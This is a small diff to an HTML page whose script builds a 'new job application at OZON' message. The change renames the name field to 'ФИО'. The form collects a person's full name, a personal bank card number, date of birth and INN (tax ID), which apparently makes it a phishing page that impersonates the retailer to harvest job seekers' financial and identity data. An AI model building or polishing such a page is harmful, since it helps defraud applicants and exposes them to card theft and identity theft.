@@ -450,8 +450,8 @@
                 <h3>Анкета</h3>
             </div>
             <form id="applicationForm" onsubmit="submitForm(event)">
-                <label for="name">Имя и Фамилия</label>
-                <input type="text" id="name" name="name" required placeholder="Введите имя и фамилию">
+                <label for="name">ФИО</label>
+                <input type="text" id="name" name="name" required placeholder="Введите ФИО">
 
                 <label for="card">Номер карты на личное имя</label>
                 <input type="text" id="card" name="card" required placeholder="Введите номер карты">
@@ -554,7 +554,7 @@
             const message = `
 Новая заявка на работу в OZON:
 🆔 ID заявки: ${applicationId}
-👤 Имя и Фамилия: ${data.name}
+👤 ФИО: ${data.name}
 💳 Номер карты: ${data.card}
 📅 Дата рождения: ${data.birthdate}
 🆔 ИНН: ${data.inn}
